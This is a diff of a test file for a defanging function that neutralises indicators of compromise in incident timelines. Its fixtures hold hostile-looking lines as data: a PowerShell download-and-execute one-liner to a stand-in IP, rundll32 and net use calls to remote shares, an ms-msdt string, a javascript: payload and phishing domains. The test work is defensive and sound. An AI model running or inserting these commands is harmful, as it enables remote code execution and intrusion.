@@ -1164,33 +1164,89 @@ describe('defangTimelineText: a file or an internal host named by itself is no l
     expect(defangTimelineText('- a: cmd.exe\n- b: 10.0.0.5')).toBe(`- a: cmd.exe\n${defangText('- b: 10.0.0.5')}`)
   })
 
-  it('leaves a dotted name as written when its label names a user, a host or a process, and nothing on the network', () => {
+  it("defangs a user's dotted name as defangText does: a name cannot be told from a domain on a TLD it does not know", () => {
     for (const line of [
       '- User: anita.garcia',
-      '- Logon account: maya.chen',
-      '    - Service: Chrome.Updater',
-      '- Host: srv01.acme'
+      '- User: evil.pro',
+      '    - Sender account: support-microsoft.help',
+      '- User: anita.ｃｏｍ',
+      'http://x.com/?q=User: evil.pro'
     ]) {
-      expect(defangText(line), line).not.toBe(line)
-      expect(defangTimelineText(line), line).toBe(line)
+      expect(defangTimelineText(line)).toBe(defangText(line))
     }
-    for (const line of ['- 21:34 User: anita.garcia', '- At 21:34, User: anita.garcia']) {
-      expect(defangTimelineText(line), line).toBe(line)
+  })
+
+  it('keeps a file or an internal host as written without changing how the rest of its line is read', () => {
+    // defangText reads a 'Label: value' line whole; a kept name in the label
+    // used to hide the label, and the value was read as prose and left live.
+    for (const line of [
+      '- C2 from WS01.corp: evil-c2.com',
+      '    - DC01.corp.local: \\\\evil.com\\share',
+      '- Alert on WS01.corp: javascript:alert(1)',
+      '- cmd.exe: evil.com',
+      '- winword.exe: \\\\evil.com\\share',
+      '- Dropped by setup.exe: update-check.net',
+      '- msdt.exe: ms-msdt:/id PCWDiagnostic /skip force',
+      '- rundll32.exe: evil.com/payload.dll',
+      // A dotted quad is an IPv4 address, whatever name it opens.
+      '- File: 185.220.101.4.exe',
+      '- 10:42 Ran 185.220.101.4.exe from %TEMP%',
+      'see 185.220.101.4.local x',
+      // A scheme before an internal host is no longer a host name alone.
+      '- Contact: mailto:ws01.corp',
+      '- Host: MAILTO:WS01.corp:445',
+      '- Seen: https://evil.com/x mailto:WS01.corp'
+    ]) {
+      expect(defangTimelineText(line)).toBe(defangText(line))
     }
-    // A value shaped like a place on the network is defanged, whatever its label says.
-    for (const line of ['- Process: evil.com', '- User: amelia.hart@lawson-rowe-review.com', '- Host: 185.91.69.119']) {
-      expect(defangTimelineText(line), line).toBe(defangText(line))
-      expect(defangTimelineText(line), line).not.toBe(line)
+    // Defanged whole as a value, the internal host goes back as written and the rest stays defanged.
+    const out = defangTimelineText('- Connection: ws01.corp:49712 -> evil.com:443')
+    expect(out).toContain('ws01.corp:49712')
+    expect(out).toContain(defangText('- Connection: evil.com:443').split(' ').pop())
+    expect(out).not.toContain('evil.com:443')
+  })
+
+  it('defangs everything else exactly as defangText does, an indicator inside a longer token too', () => {
+    // Over-defanging is safe and under-defanging is not: only a plain dotted
+    // name is ever kept, so nothing can hide behind = , ; \ @ : ( or a scheme.
+    for (const line of [
+      // Other labels name nothing off the network for certain.
+      '- Host: srv01.acme',
+      '- Service: Chrome.Updater',
+      '- C2 server: update-check.me',
+      '- Destination host: update-check.me',
+      '- Host: login-microsoft.zip',
+      '- File: login-microsoft.zip',
+      '- Download: evil.it/a.exe',
+      '- Phishing login: m365-login.me',
+      // A user label keeps no country-code name and nothing with more in it.
+      '- User: wei.li',
+      '- Account: svc_backup,attacker@evil.com',
+      '- 14:05 User: bob;alice@evil.com',
+      '- User: [anita](http://evil.com/login)',
+      '- User clicked link: <https://evil.com/login>',
+      '- 21:34 User: jdoe signed in (from 203.0.113.9)',
+      // Indicators inside command lines, key=value runs and joined values.
+      '- Command line: net use \\\\203.0.113.9\\c$ /user:admin',
+      '- Command line: rundll32.exe \\\\203.0.113.9\\share\\x.dll,Entry',
+      '- Process: cmd.exe /c ping -n 1 203.0.113.9&&calc.exe',
+      `- Process: powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"`,
+      '- Host: WS01,203.0.113.5',
+      '- 14:03 Alert on host WS01: outbound connection (to 203.0.113.5).',
+      '- 14:03 Sysmon 3 src=10.0.0.5,dst=203.0.113.9,image=rundll32.exe',
+      '- 14:05 Mail from=bob@evil.com,attach=invoice.pdf',
+      '- 10:02 Execution: cmd /c ping -n 1 185.220.101.4>nul',
+      '- 10:03 Email: delivered to anita@corp.com,bob@corp.com',
+      '- 10:07 Host WS01 talked to: 185.220.101.4,185.220.101.5'
+    ]) {
+      expect([line, defangTimelineText(line)]).toEqual([line, defangText(line)])
     }
-    // A network label keeps defangText's reading of the value as a host.
-    expect(defangTimelineText('- Beacon: anita.garcia')).toBe(defangText('- Beacon: anita.garcia'))
-    const steps = findTimelines([
-      '%% timeline steps %%',
-      '- User: anita.garcia',
-      '- Host: WS01',
-      '- Beacon: c2.evil.com'
+    const events = findTimelines([
+      '%% timeline %%',
+      '- 21:34 User: jdoe signed in (from 203.0.113.9)',
+      '- 14:03 Sysmon 3 src=10.0.0.5,dst=203.0.113.9,image=rundll32.exe'
     ])[0]
-    expect(steps.summary.live).toBe(1)
+    expect(events.summary.live).toBeGreaterThan(0)
   })
 
   it('counts no file and no internal host as a live indicator, in steps and chains', () => {
